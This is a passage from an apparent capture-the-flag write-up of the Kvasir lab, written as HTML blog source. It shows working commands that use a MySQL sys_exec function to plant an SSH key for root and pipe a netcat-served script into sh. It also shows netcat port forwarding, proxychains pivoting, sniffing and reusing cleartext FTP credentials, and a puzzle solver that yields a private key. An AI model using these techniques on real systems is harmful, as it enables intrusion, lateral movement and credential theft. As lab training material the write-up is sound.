mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;select sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&amp;quot; &amp;gt; /root/.ssh/authorized_keys&amp;quot;)&#39; 2&amp;gt;&amp;gt; log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this file ready, I opened a netcat port to pipe it to, and read it on &lt;code&gt;web&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# on the attacking machine, I opened netcat with my mysql commands
root@kali:~# nc -lvp 4444 &amp;lt; load_udf.sh
listening on [any] 4444 ...

# then on the original netcat shell I have, read it
timeout 3 nc 192.168.56.101 4444 | sh
name    ret dl  type
sys_exec    2   raptor_udf.so   function
sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of &lt;code&gt;0&lt;/code&gt;, indicating that it was successful. I specify the &lt;code&gt;timeout&lt;/code&gt; command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)&lt;/p&gt;

&lt;h2 id=&#34;ssh-to-db-host&#34;&gt;ssh to db host&lt;/h2&gt;

&lt;p&gt;With all that done, I have my public key for the &lt;code&gt;root&lt;/code&gt; user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I &lt;em&gt;get&lt;/em&gt; to 192.168.2.200&amp;rsquo;s port 22? :)&lt;/p&gt;

&lt;p&gt;For that, I decided to look at &lt;code&gt;netcat&lt;/code&gt; port forwarding! But first, lets read some man pages:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#from nc(1)
OPTIONS
       -c string    specify shell commands to exec after connect (use with caution).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;&amp;ldquo;use with caution&amp;rdquo;&lt;/em&gt;. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_clear_as_mud.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Lets see this in action. First I setup the initial listener on the attacking machine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# listen on tcp/4444, re-listening on tcp/222 on a new connection
root@kali:~# nc -lvp 4444 -c &amp;quot;nc -lvp 222&amp;quot;
listening on [any] 4444 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the listener setup, lets issue a new &lt;code&gt;nc&lt;/code&gt; command in the initial shell that I got on &lt;code&gt;web&lt;/code&gt;, connecting the dots:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc 192.168.56.101 4444 -c &amp;quot;nc 192.168.2.200 22&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When this runs, the initial listener will see the new connection, and I should have the &lt;code&gt;tcp/22&lt;/code&gt; of &lt;strong&gt;192.168.2.200&lt;/strong&gt; now forwarded locally:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -lvp 4444 -c &amp;quot;nc -lvp 222&amp;quot;
listening on [any] 4444 ...

# connection comes in from 192.168.1.100
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
listening on [any] 222 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
root@db:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I added the &lt;code&gt;-D&lt;/code&gt; option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a &lt;em&gt;almost&lt;/em&gt; &lt;em&gt;direct&lt;/em&gt; connection to the &lt;code&gt;db&lt;/code&gt; (192.168.2.200) host, as denoted in green below:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;8-)&lt;/p&gt;

&lt;h2 id=&#34;not-exactly-nsa-level-spying-but-heh&#34;&gt;not exactly nsa level spying but heh&lt;/h2&gt;

&lt;p&gt;Initial enumeration revealed that this host (&lt;code&gt;db&lt;/code&gt;) had 2 network interfaces. One with IP &lt;strong&gt;192.168.2.200&lt;/strong&gt; (the one I came in from), and another with IP &lt;strong&gt;192.168.3.200&lt;/strong&gt;. There were also 2 entries in &lt;code&gt;/etc/hosts&lt;/code&gt; about 2 hosts in the 3.x network:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# cat /etc/hosts
# 192.168.3.40  celes
# 192.168.3.50  terra

[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Nov08 ?        00:00:00 init [3]
root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER)
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A interesting file was in &lt;code&gt;/root/.words.txt&lt;/code&gt;, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# head /root/.words.txt
borne
precombatting
noncandescent
cushat
lushness
precensure
romishness
nonderivable
overqualification
superkojiman
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally, a troll flag :D&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# cat /root/flag
This is not the flag you&#39;re looking for... :p
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user &lt;code&gt;celes&lt;/code&gt; in &lt;code&gt;/etc/pure-ftpd/pureftpd.passwd&lt;/code&gt;, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.&lt;/p&gt;

&lt;p&gt;At one stage, I was checking to see what network activity was present on the interfaces, of which &lt;code&gt;eth0&lt;/code&gt; had my SSH session, and &lt;code&gt;eth1&lt;/code&gt; was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
13:19:01.355970 IP 192.168.3.40.36425 &amp;gt; 192.168.3.200.ftp: Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
13:19:01.355988 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0

[... snip ...]

13:19:01.378604 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
13:19:01.378631 IP 192.168.3.40.36425 &amp;gt; 192.168.3.200.ftp: Flags [R], seq 2471029587, win 0, length 0
^C
29 packets captured
29 packets received by filter
0 packets dropped by kernel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I changed the command to add the &lt;code&gt;-X&lt;/code&gt; flag as this looked like FTP traffic flowing over the interface (you haven&amp;rsquo;t forgotten the ftp server yet have you?).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;13:25:01.387981 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38
    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~&amp;quot;@.@.4+....
    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........&#39;x
    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..&#39;w331.User.cel
    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
    0x0050:  7265 7175 6972 6564 0d0a                 required..

13:25:01.388050 IP 192.168.3.40.36437 &amp;gt; 192.168.3.200.ftp: Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19
    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&amp;gt;r...(
    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............&#39;x
    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..&#39;xPASS.im22BF4
    0x0040:  4858 6e30 310d 0a                        HXn01..

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the &lt;code&gt;-W&lt;/code&gt; flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_ftp_session.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It seems like &lt;code&gt;celes&lt;/code&gt; is simply logging in, getting a directory listing, and logging out.&lt;/p&gt;

&lt;p&gt;Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to &lt;strong&gt;192.168.3.40&lt;/strong&gt; (the ip the FTP conversation was coming from) using &lt;code&gt;celes:im22BF4HXn01&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# ssh celes@192.168.3.40
celes@192.168.3.40&#39;s password: # entered im22BF4HXn01
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:20:00 2014
celes@dev1:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;finding-terras-secret&#34;&gt;finding terras secret&lt;/h2&gt;

&lt;p&gt;Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I don’t have connectivity directly to &lt;strong&gt;192.168.3.40&lt;/strong&gt; at the moment, but if I really need that I can arrange it. For now, lets see what we have on &lt;code&gt;dev1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;First, I find the sneaky ftp session script &lt;code&gt;getLogs.py&lt;/code&gt;, that does exactly that which I saw in the packet captures. Next, I find a message in &lt;code&gt;celes&lt;/code&gt; mailbox:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;celes@dev1:~$ cat /var/spool/mail/celes
Return-path: &amp;lt;celes@localhost&amp;gt;
Received: from celes by localhost with local (Exim 4.80)
    (envelope-from &amp;lt;celes@localhost&amp;gt;)
    id 1XHczw-0000V2-8y
    for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
Date: Wed, 13 Aug 2014 19:10:08 +0100
To: celes@127.0.0.1
Subject: Reminder
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &amp;lt;E1XHczw-0000V2-8y@localhost&amp;gt;
From: celes@localhost

Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The message reveals that Terra has a puzzle on her machine (&lt;strong&gt;192.168.3.50&lt;/strong&gt; from &lt;code&gt;/etc/hosts&lt;/code&gt; on the &lt;code&gt;db&lt;/code&gt; server?). She also mentions &lt;code&gt;kvasir.png&lt;/code&gt;, which happens to be in &lt;code&gt;celese&lt;/code&gt; home directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;celes@dev1:~$ ls -lah kvasir.png
-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, the &lt;code&gt;.bash_history&lt;/code&gt; for &lt;code&gt;celese&lt;/code&gt; has a entry &lt;code&gt;stepic --help&lt;/code&gt;. &lt;code&gt;stepic&lt;/code&gt; is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&amp;rsquo;s machine. So, I converted the &lt;code&gt;kvasir.png&lt;/code&gt; image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using &lt;code&gt;xxd -r -p kvasir.png.xxd &amp;gt; kvasir.png&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_kvasir.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;getting-stepic-to-play-nice&#34;&gt;getting stepic to play nice&lt;/h3&gt;

&lt;p&gt;With the image ready, I searched for &lt;code&gt;stepic&lt;/code&gt; using &lt;code&gt;pip&lt;/code&gt; in my virtual env and installed it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# pip install stepic
Downloading/unpacking stepic
  Downloading stepic-0.4%7ebzr.tar.gz
  Running setup.py egg_info for package stepic

Installing collected packages: stepic
  Running setup.py install for stepic
    changing mode of build/scripts-2.7/stepic from 644 to 755

    changing mode of /root/kvasir/bin/stepic to 755
Successfully installed stepic
Cleaning up...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, &lt;code&gt;stepic&lt;/code&gt; was not just a case of plug and play for me. &lt;strong&gt;NOPE&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# stepic
Traceback (most recent call last):
  File &amp;quot;/root/kvasir/bin/stepic&amp;quot;, line 24, in &amp;lt;module&amp;gt;
    import Image
ImportError: No module named Image
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Long story short, a small hack and installation of another dependency finally got it working for me:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# pip install pillow
Downloading/unpacking pillow
  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
  Running setup.py egg_info for package pillow
    Single threaded build, not installing mp_compile: 1 processes

[... snip ...]

    *** OPENJPEG (JPEG2000) support not available
    --- ZLIB (PNG/ZIP) support available

[... snip ...]

Successfully installed pillow
Cleaning up...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The final hack was to change the installed &lt;code&gt;stepic&lt;/code&gt; bin at &lt;code&gt;/root/kvasir/bin/stepic&lt;/code&gt; line 24 from &lt;code&gt;import Image&lt;/code&gt; to &lt;code&gt;from PIL import Image&lt;/code&gt;. Finally, &lt;code&gt;stepic&lt;/code&gt; was working fine.&lt;/p&gt;

&lt;h3 id=&#34;finding-the-secret&#34;&gt;finding the secret&lt;/h3&gt;

&lt;p&gt;With &lt;code&gt;stepic&lt;/code&gt; up and running, I was finally able to run it against the image &lt;code&gt;kvasir.png&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# stepic --decode --image-in=kvasir.png --out=out

# check the file type we got out
root@kali:~# file out
out: ASCII text, with very long lines, with no line terminators

# check the output we got
root@kali:~# cat out
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
df9bb4ae0a3dc20000000049454e44ae426082
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this stage I was pretty convinced my hacks to get &lt;code&gt;stepic&lt;/code&gt; to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.&lt;/p&gt;

&lt;p&gt;Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of &lt;code&gt;decode()&lt;/code&gt; methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python
Python 2.7.3 (default, Mar 14 2014, 11:57:14)
[GCC 4.7.2] on linux2
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; &amp;quot;89504e470d0a1a0a000000&amp;quot;.decode(&amp;quot;hex&amp;quot;)
&#39;\x89PNG\r\n\x1a\n\x00\x00\x00&#39;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Decoding it as &lt;code&gt;hex&lt;/code&gt; revealed the part I needed to see&amp;hellip; &lt;code&gt;PNG&lt;/code&gt;! So this string was a hex encoded PNG image (unless thats a troll too&amp;hellip;). I took &lt;code&gt;out&lt;/code&gt; and reversed it using &lt;code&gt;xxd -r -p&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# xxd -p -r out &amp;gt; kvasir2.png
root@kali:~# file kvasir2.png
kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets see what the image looks like:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_kvasir_qr.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A QR code! I fetched my phone and scanned it, revealing the string &lt;code&gt;Nk9yY31hva8q&lt;/code&gt;. Great!&amp;hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for &lt;code&gt;dev1&lt;/code&gt; either.&lt;/p&gt;

&lt;h2 id=&#34;playing-terra-s-game&#34;&gt;playing Terra&amp;rsquo;s game&lt;/h2&gt;

&lt;p&gt;Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&amp;rsquo;s game as per the email. From the &lt;code&gt;/etc/hosts&lt;/code&gt; on &lt;code&gt;db&lt;/code&gt;, I saw a comment for &lt;code&gt;terra&lt;/code&gt; as &lt;strong&gt;192.168.3.50&lt;/strong&gt;. Using the SSH socks proxy on &lt;code&gt;tcp/8000&lt;/code&gt; I setup when I setup the SSH session to &lt;strong&gt;192.168.2.200&lt;/strong&gt;, I nmapped &lt;strong&gt;192.168.3.50&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
# socks5    127.0.0.1 8000

# scans will appear to be coming from 192.168.3.200 for
# 192.168.3.50
root@kali:~# proxychains nmap -sT 192.168.3.50
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 16:31 SAST
Nmap scan report for 192.168.3.50
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well &lt;code&gt;tcp/4444&lt;/code&gt; looks interesting! Lets have a look!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc 192.168.3.50 4444
ProxyChains-3.1 (http://proxychains.sf.net)
Hello Celes &amp;amp; Welcome to the Jumble!

Solve:indrssoses
Solve:roneb bob
Solve:abaerrbs

[... snip ...]

Solve:iepasncm

Score: 0
Time: 22.71 secs
Just a bit embarrasing really...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Don&amp;rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the &lt;em&gt;Solve:&lt;/em&gt; as ones that are scrambled from the previously found &lt;code&gt;.words.txt&lt;/code&gt; file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from &lt;code&gt;.words.txt&lt;/code&gt;. With the &lt;code&gt;.words.txt&lt;/code&gt; file locally available, I slapped together something to try and do this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Kvasir Terra Puzzle Solver

import sys
import socket
import base64

# read the words.txt we got into a list
with open(&#39;words.txt&#39;) as f:
    words = f.read().splitlines()

# connection to the game
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&#39;192.168.3.50&#39;, 4444))

# start processing the lines
while True:

    # receive a frame large enough
    frame = sock.recv(150)

    # check that its a question frame
    if &#39;Solve&#39; not in frame:
        print &amp;quot;[!] &#39;Solve&#39; not in frame. Game over?&amp;quot;
        break

    # split the frame with :
    frame = frame.split(&#39;:&#39;)
    if len(frame) &amp;lt; 2:
        print &amp;quot;[!] Was unable to split by :. Game over?&amp;quot;
        break

    question = frame[1].strip()

    # @barrebas suggested a length check too to increase probability :)
    result = [s for s in words if not s.strip(question) and len(question) == len(s)]
    #result = [s for s in words if not s.strip(question)]

    if len(result) &amp;lt; 1:
        print &amp;quot;[!] Was unable to match anything to %s&amp;quot; % question
        continue

    answer = result[0].strip()

    print &amp;quot;[+] Matched %s to %s&amp;quot; % (question, answer)
    sock.send(answer)

# did we win? \:D/
if &#39;You\&#39;re a winner&#39; in frame:
    print &amp;quot;[+] We won!&amp;quot;

    # read the rest of the socket output
    frame += sock.recv(2500)

    # base64 decode the last string
    print &amp;quot;[+] Extracing and decoding the base64 section&amp;quot;
    print base64.b64decode(frame.split(&#39;\n&#39;)[-1])
    sys.exit(0)

sock.close

# work with what we have left
print &amp;quot;[+] Last frame was:\n %s&amp;quot; % frame
print &amp;quot;[+] Done&amp;quot;
sys.exit(0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the &lt;code&gt;base64.b64decode(frame.split(&#39;\n&#39;)[-1])&lt;/code&gt; section to the script so that if you win it will print the cleartext version.&lt;/p&gt;

&lt;p&gt;The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./play.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Matched atravdeii to radiative
[+] Matched oilyaerbdmpn to imponderably

[... snip ...]
[+] Matched idmlhkeir to kriemhild
[!] &#39;Solve&#39; not in frame. Game over?
[+] We won!
[+] Extracing and decoding the base64 section
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D

OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
